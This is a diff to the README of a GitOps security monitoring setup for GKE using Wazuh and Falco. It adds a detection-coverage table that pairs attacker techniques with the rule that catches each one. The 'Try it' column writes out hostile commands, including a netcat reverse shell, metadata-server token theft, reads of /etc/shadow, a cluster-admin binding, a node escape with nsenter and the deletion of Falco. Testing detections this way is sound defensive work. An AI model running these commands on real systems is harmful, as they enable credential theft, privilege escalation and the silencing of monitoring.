@@ -10,10 +10,12 @@ service account key exists anywhere: Google Cloud access goes through **GKE Work
 
 - **Keyless.** The Wazuh GCP collector pulls Pub/Sub with Workload Identity; Falcosidekick publishes to it
   and External Secrets reads Secret Manager the same way. No JSON key is created, stored or mounted.
-- **Three layers of detection.** Google Cloud audit logs with the standard Wazuh ruleset, the GKE
+- **Three layers of detection.** Google Cloud audit logs with the standard Wazuh ruleset and custom
+  high-signal rules (service account keys, IAM changes, impersonation, public buckets, secret reads), the GKE
   Kubernetes audit log with custom Sigma rules (exec into pods, RBAC, secrets, workloads outside GitOps,
   admission webhooks), and Falco eBPF on every node for what runs inside containers (sensitive file reads,
-  reverse shells, privileged or host-mounted containers, untrusted images).
+  reverse shells, privileged or host-mounted containers, untrusted images). Every technique is listed with
+  how to reproduce it under [Detection coverage](#detection-coverage).
 - **Fully GitOps.** Wazuh configuration, PKI, generated passwords, agent enrollment, ruleset activation,
   custom decoders, rules and detectors, the Slack channel, alert monitors and the security dashboard are all
   reconciled from Git; nothing is clicked in the dashboard.
@@ -239,6 +241,84 @@ A Falco finding reaches Slack titled with the Falco rule (for example *Read sens
 then the Wazuh rule that raised it (*Falco runtime threat: Warning*), the node, the process and user, the
 container and image, the namespace and pod, and the Falco output. The standard `gcp` decoder also keeps a
 generic copy of each alert in `wazuh-events-v5-cloud-services`, without findings.
+
+## Detection coverage
+
+What an attacker does, which rule catches it and at what level. High and critical findings reach Slack.
+Each line can be reproduced in a throwaway namespace (the cluster rules) or with throwaway `sim-`
+resources (the Google Cloud rules), removed right after.
+
+### Kubernetes API (GKE audit log, `gke-kubernetes`)
+
+| Technique | Try it | Rule | Level |
+|---|---|---|---|
+| Shell into a pod | `kubectl exec <pod> -- sh` | GKE exec or attach into a pod | high |
+| Shell into a system or security pod | `kubectl -n wazuh exec <pod> -- sh` | GKE exec or attach into a system or security pod | critical |
+| Debug container | `kubectl debug <pod> --image=busybox` | GKE ephemeral container added to a pod | high |
+| Workload outside GitOps | `kubectl run x --image=busybox` | GKE workload created outside GitOps | high |
+| Workload in a system namespace | `kubectl -n kube-system run x --image=busybox` | GKE workload created in a system or security namespace outside GitOps | critical |
+| Backdoored workload | `kubectl set image` / `kubectl edit` / `kubectl rollout restart` | GKE workload modified outside GitOps | high |
+| Persistence by CronJob | `kubectl create cronjob x --image=busybox --schedule='*/30 * * * *' -- sh` | GKE workload created outside GitOps | high |
+| Privilege grant | `kubectl create clusterrolebinding x --clusterrole=cluster-admin --serviceaccount=ns:sa` | GKE RBAC binding created or changed | high |
+| Stolen pod token probing the API | `curl` the API server with the pod's token for a write it may not do | GKE write denied to a workload service account, GKE API write from a scripting or attack tool | high |
+| Secret planted or changed | `kubectl create secret generic x --from-literal=k=v` | GKE secret changed outside GitOps | high |
+| Long-lived client certificate | create and approve a CertificateSigningRequest | GKE certificate signing request created / approved | high / critical |
+| Admission webhook | create a ValidatingWebhookConfiguration | GKE admission webhook changed | high |
+| Aggregated API | create an APIService | GKE aggregated API service registered | critical |
+| Network opened | create or delete a NetworkPolicy | GKE NetworkPolicy changed outside GitOps | high |
+| Service exposed | `kubectl expose` / `kubectl create service` | GKE service exposed outside GitOps | high |
+| Data destroyed | `kubectl delete pvc x` | GKE persistent volume deleted outside GitOps | high |
+| Runtime security stopped | `kubectl -n falco delete daemonset falco` | GKE runtime security tampered outside GitOps | critical |
+| Impersonation (`kubectl --as`) | any of the above with `--as=system:serviceaccount:argocd:argocd-application-controller` | the same rules: the audit log keeps the real caller | as above |
+
+### Inside containers (Falco, `falco`)
+
+| Technique | Try it | Falco rule | Level |
+|---|---|---|---|
+| Read credentials | `cat /etc/shadow` | Read sensitive file untrusted | high |
+| Hunt for keys | `find / -name id_rsa`, `grep -r password /etc` | Search Private Keys or Passwords | high |
+| Malware dropped and run | download a binary to `/tmp` and run it | Drop and execute new binary in container | critical |
+| Fileless malware | run a binary from `memfd_create` | Fileless execution via memfd_create | critical |
+| Reverse shell | `nc <host> 4444 -e /bin/sh` | Redirect STDOUT/STDIN to Network Connection in Container | critical |
+| Token theft from the metadata server | `wget --header 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` | Contact GKE metadata server from container | critical |
+| Process injection | `ptrace` attach to another process | PTRACE attached to process | high |
+| Tools installed | `apk add`, `apt-get install`, `pip install` | Package management process launched in container | high |
+| Binary planted | write a file under `/usr/bin` or `/usr/local/bin` | Write below binary directory in container | high |
+| Tracks covered | empty a log under `/var/log`, delete `~/.ash_history` | Clear Log Activities, Shell history deleted or truncated in container | high |
+| Hard or symbolic link to a sensitive file | `ln /etc/shadow /tmp/x`, `ln -s /etc/shadow /tmp/x` | Create Hardlink / Symlink Over Sensitive Files | high |
+| Directory traversal | `cat ../../../../etc/passwd` | Directory traversal monitored file read | high |
+| Privileged pod | pod with `securityContext.privileged: true` | Privileged container started | critical |
+| Host namespaces | pod with `hostNetwork` or `hostPID` | Container with host namespaces started | critical |
+| Host filesystem mounted | pod with a `hostPath` of `/`, `/etc` or a runtime socket | Container with sensitive host mount started | critical |
+| Escape to the node | `nsenter -t 1 -m -u -i -n -p` from a privileged pod, then read a host file | Privileged container started, Read sensitive file untrusted | critical, high |
+| Untrusted image | `kubectl run x --image=alpine` | Container from an untrusted image started | critical |
+| Falco silenced | stop Falco or cut its path to Wazuh for 30 minutes | Falco runtime detection silent (monitor) | critical |
+
+### Google Cloud (audit logs, `gcp-security` and the standard `gcp` rules)
+
+| Technique | Try it | Rule | Level |
+|---|---|---|---|
+| Service account key | `gcloud iam service-accounts keys create` | GCP service account key created | critical |
+| Privilege escalation | `gcloud projects add-iam-policy-binding … --role roles/editor` | GCP project IAM policy changed | high |
+| Impersonation path | grant `roles/iam.serviceAccountTokenCreator` on a service account | GCP service account IAM policy changed | high |
+| Impersonation | `gcloud auth print-access-token --impersonate-service-account` | GCP service account impersonated | high |
+| Port opened to the internet | `gcloud compute firewall-rules create … --source-ranges 0.0.0.0/0` | GCP firewall rule created or changed | high |
+| Bucket made public | `gcloud storage buckets add-iam-policy-binding … --member allUsers` | GCP storage bucket IAM policy changed | high |
+| Logs redirected | `gcloud logging sinks create` | GCP log sink created or changed | high |
+| Logs cut off | `gcloud logging sinks delete` | Cloud services audit logging disabled (standard) | high |
+| Secret read | `gcloud secrets versions access` by anyone but External Secrets | GCP secret read outside External Secrets | high |
+| Encryption key destroyed | `gcloud kms keys versions destroy` | GCP KMS key version destroyed | critical |
+| Service account created or deleted | `gcloud iam service-accounts create` / `delete` | GCP service account created / deleted or disabled (standard) | medium |
+
+### Not detected
+
+- Reads of the Kubernetes API (listing secrets, `nodes/proxy`, TokenRequests): GKE writes them only to the
+  Data Access audit log, which is off for `container.googleapis.com`.
+- Privileged or host-mounted pods as an API call: the pod spec is unindexed in the audit log; Falco sees
+  them when the container starts instead.
+- Port scans inside the cluster: no rule; the default-deny NetworkPolicies of `wazuh` and `falco` block them.
+- `cluster-admin` versus a lesser role in a new binding: the `roleRef` is unindexed, so every binding made
+  outside GitOps is high.
 
 ## Repository layout
 
